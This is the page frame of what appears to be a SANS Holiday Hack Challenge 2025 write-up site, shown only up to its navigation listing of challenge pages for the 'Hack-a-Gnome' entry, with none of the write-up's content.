<!DOCTYPE html><html lang="en" class="no-js"><head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://tominthebytes.github.io/SANS-HHC-2025/act_3/hack_a_gnome/">
      
      
        <link rel="prev" href="../../act_2/gnome_identity/">
      
      
      
        
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>Hack-a-Gnome - SANS Holiday Hack Challenge 2025 Write-up</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      
  
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
  
  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M64%20480c-35.3%200-64-28.7-64-64V96c0-35.3%2028.7-64%2064-64h320c35.3%200%2064%2028.7%2064%2064v213.5c0%2017-6.7%2033.3-18.7%2045.3L322.7%20461.3c-12%2012-28.3%2018.7-45.3%2018.7zm325.5-176H296c-13.3%200-24%2010.7-24%2024v93.5z%22/%3E%3C/svg%3E');--md-admonition-icon--abstract:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M384%20512H96c-53%200-96-43-96-96V96C0%2043%2043%200%2096%200h304c26.5%200%2048%2021.5%2048%2048v288c0%2020.9-13.4%2038.7-32%2045.3V448c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032zM96%20384c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h256v-64zm32-232c0%2013.3%2010.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24H152c-13.3%200-24%2010.7-24%2024m24%2072c-13.3%200-24%2010.7-24%2024s10.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24z%22/%3E%3C/svg%3E');--md-admonition-icon--info:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%20512a256%20256%200%201%200%200-512%20256%20256%200%201%200%200%20512m-32-352a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200m-8%2064h48c13.3%200%2024%2010.7%2024%2024v88h8c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-80c-13.3%200-24-10.7-24-24s10.7-24%2024-24h24v-64h-24c-13.3%200-24-10.7-24-24s10.7-24%2024-24%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M461.2%2018.9C472.7%2024%20480%2035.4%20480%2048v416c0%2012.6-7.3%2024-18.8%2029.1s-24.8%203.2-34.3-5.1l-46.6-40.7c-43.6-38.1-98.7-60.3-156.4-63V480c0%2017.7-14.3%2032-32%2032h-32c-17.7%200-32-14.3-32-32v-96C57.3%20384%200%20326.7%200%20256s57.3-128%20128-128h84.5c61.8-.2%20121.4-22.7%20167.9-63.3L427%2024c9.4-8.3%2022.9-10.2%2034.3-5.1zM224%20320v.2c70.3%202.7%20137.8%2028.5%20192%2073.4V118.3c-54.2%2044.9-121.7%2070.7-192%2073.4z%22/%3E%3C/svg%3E');--md-admonition-icon--success:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M434.8%2070.1c14.3%2010.4%2017.5%2030.4%207.1%2044.7l-256%20352c-5.5%207.6-14%2012.3-23.4%2013.1s-18.5-2.7-25.1-9.3l-128-128c-12.5-12.5-12.5-32.8%200-45.3s32.8-12.5%2045.3%200l101.5%20101.5%20234-321.7c10.4-14.3%2030.4-17.5%2044.7-7.1z%22/%3E%3C/svg%3E');--md-admonition-icon--question:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%20512a256%20256%200%201%200%200-512%20256%20256%200%201%200%200%20512m0-336c-17.7%200-32%2014.3-32%2032%200%2013.3-10.7%2024-24%2024s-24-10.7-24-24c0-44.2%2035.8-80%2080-80s80%2035.8%2080%2080c0%2047.2-36%2067.2-56%2074.5v3.8c0%2013.3-10.7%2024-24%2024s-24-10.7-24-24v-8.1c0-20.5%2014.8-35.2%2030.1-40.2%206.4-2.1%2013.2-5.5%2018.2-10.3%204.3-4.2%207.7-10%207.7-19.6%200-17.7-14.3-32-32-32zm-32%20192a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%200c14.7%200%2028.2%208.1%2035.2%2021l216%20400c6.7%2012.4%206.4%2027.4-.8%2039.5S486.1%20480%20472%20480H40c-14.1%200-27.2-7.4-34.4-19.5s-7.5-27.1-.8-39.5l216-400c7-12.9%2020.5-21%2035.2-21m0%20352a32%2032%200%201%200%200%2064%2032%2032%200%201%200%200-64m0-192c-18.2%200-32.7%2015.5-31.4%2033.7l7.4%20104c.9%2012.5%2011.4%2022.3%2023.9%2022.3%2012.6%200%2023-9.7%2023.9-22.3l7.4-104c1.3-18.2-13.1-33.7-31.4-33.7z%22/%3E%3C/svg%3E');--md-admonition-icon--failure:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20576%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M480-16c6.9%200%2013%204.4%2015.2%2010.9l13.5%2040.4%2040.4%2013.5C555.6%2051%20560%2057.1%20560%2064s-4.4%2013-10.9%2015.2l-40.4%2013.5-13.5%2040.4c-2.2%206.5-8.3%2010.9-15.2%2010.9s-13-4.4-15.2-10.9l-13.5-40.4-40.4-13.5C404.4%2077%20400%2070.9%20400%2064s4.4-13%2010.9-15.2l40.4-13.5%2013.5-40.4C467-11.6%20473.1-16%20480-16M321.4%2097.4c12.5-12.5%2032.8-12.5%2045.3%200l80%2080c12.5%2012.5%2012.5%2032.8%200%2045.3l-10.9%2010.9c7.9%2022%2012.2%2045.7%2012.2%2070.5%200%20114.9-93.1%20208-208%20208S32%20418.9%2032%20304%20125.1%2096%20240%2096c24.7%200%2048.5%204.3%2070.5%2012.3zM144%20304c0-53%2043-96%2096-96%2013.3%200%2024-10.7%2024-24s-10.7-24-24-24c-79.5%200-144%2064.5-144%20144%200%2013.3%2010.7%2024%2024%2024s24-10.7%2024-24%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M416%20427.4c58.5-44%2096-111.6%2096-187.4C512%20107.5%20397.4%200%20256%200S0%20107.5%200%20240c0%2075.8%2037.5%20143.4%2096%20187.4V464c0%2026.5%2021.5%2048%2048%2048h32v-40c0-13.3%2010.7-24%2024-24s24%2010.7%2024%2024v40h64v-40c0-13.3%2010.7-24%2024-24s24%2010.7%2024%2024v40h32c26.5%200%2048-21.5%2048-48zM96%20256a64%2064%200%201%201%20128%200%2064%2064%200%201%201-128%200m256-64a64%2064%200%201%201%200%20128%2064%2064%200%201%201%200-128%22/%3E%3C/svg%3E');--md-admonition-icon--bug:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20640%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M352%200c0-17.7-14.3-32-32-32s-32%2014.3-32%2032v64h-96c-53%200-96%2043-96%2096v224c0%2053%2043%2096%2096%2096h256c53%200%2096-43%2096-96V160c0-53-43-96-96-96h-96zM160%20368c0-13.3%2010.7-24%2024-24h32c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-32c-13.3%200-24-10.7-24-24m120%200c0-13.3%2010.7-24%2024-24h32c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-32c-13.3%200-24-10.7-24-24m120%200c0-13.3%2010.7-24%2024-24h32c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-32c-13.3%200-24-10.7-24-24M224%20176a48%2048%200%201%201%200%2096%2048%2048%200%201%201%200-96m144%2048a48%2048%200%201%201%2096%200%2048%2048%200%201%201-96%200m-304%200c0-17.7-14.3-32-32-32S0%20206.3%200%20224v96c0%2017.7%2014.3%2032%2032%2032s32-14.3%2032-32zm544-32c-17.7%200-32%2014.3-32%2032v96c0%2017.7%2014.3%2032%2032%2032s32-14.3%2032-32v-96c0-17.7-14.3-32-32-32%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M288%200H128c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032v151.5L7.5%20426.3C2.6%20435%200%20444.7%200%20454.7%200%20486.4%2025.6%20512%2057.3%20512h333.4c31.6%200%2057.3-25.6%2057.3-57.3%200-10-2.6-19.8-7.5-28.4L320%20215.5V64c17.7%200%2032-14.3%2032-32S337.7%200%20320%200zm-96%20215.5V64h64v151.5c0%2011.1%202.9%2022.1%208.4%2031.8L306%20320H142l41.6-72.7c5.5-9.7%208.4-20.6%208.4-31.8%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M0%20216C0%20149.7%2053.7%2096%20120%2096h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064H64c-35.3%200-64-28.7-64-64zm256%200c0-66.3%2053.7-120%20120-120h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064h-64c-35.3%200-64-28.7-64-64z%22/%3E%3C/svg%3E');}</style>



    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style></head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#hack-a-gnome" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-up" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M64 32c-17.7 0-32 14.3-32 32s14.3 32 32 32v160c0 41.8 26.7 77.4 64 90.5V416H56c-13.3 0-24 10.7-24 24s10.7 24 24 24h504c44.2 0 80-35.8 80-80v-8c0-13.3-10.7-24-24-24s-24 10.7-24 24v8c0 17.7-14.3 32-32 32h-80v-64c53 0 96-43 96-96v-96c17.7 0 32-14.3 32-32s-14.3-32-32-32h-32c-17.7 0-32 14.3-32 32v32c0 35.3-28.7 64-64 64h-48.9c-48.5 0-92.8-27.4-114.5-70.8l-25.2-50.5C237.7 59.4 193.4 32 144.9 32zm368 384H176v-64h256z"></path></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS Holiday Hack Challenge 2025 Write-up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Hack-a-Gnome
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-up" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M64 32c-17.7 0-32 14.3-32 32s14.3 32 32 32v160c0 41.8 26.7 77.4 64 90.5V416H56c-13.3 0-24 10.7-24 24s10.7 24 24 24h504c44.2 0 80-35.8 80-80v-8c0-13.3-10.7-24-24-24s-24 10.7-24 24v8c0 17.7-14.3 32-32 32h-80v-64c53 0 96-43 96-96v-96c17.7 0 32-14.3 32-32s-14.3-32-32-32h-32c-17.7 0-32 14.3-32 32v32c0 35.3-28.7 64-64 64h-48.9c-48.5 0-92.8-27.4-114.5-70.8l-25.2-50.5C237.7 59.4 193.4 32 144.9 32zm368 384H176v-64h256z"></path></svg>

    </a>
    SANS Holiday Hack Challenge 2025 Write-up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Welcome
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2">
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Prologue
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Prologue
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../prologue/holiday_hack_orientation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Holiday Hack Orientation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3">
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 1
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 1
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/storage_secrets/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blob Storage Challenge in the Neighborhood
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/defang/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Defang
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/intro_to_nmap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Intro to Nmap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/fire_alarm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Neighborhood Watch Bypass
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/owner/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Owner
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/santas_gift_tracking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Santa's Gift-Tracking Service Port Mystery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/spare_key/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Spare Key
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/the_open_door/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    The Open Door
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/visual_firewall/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Visual Firewall Thinger
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_1/visual_networking/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Visual Networking Thinger
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4">
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 2
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 2
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_2/dosis_network_down/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Dosis Network Down
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_2/going_in_reverse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Going in Reverse
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_2/idorable_bistro/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    IDORable Bistro
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_2/mail_detective/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Mail Detective
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_2/quantgnome_leap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Quantgnome Leap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_2/retro_recovery/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Retro Recovery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../act_2/gnome_identity/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Rogue Gnome Identity Provider
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
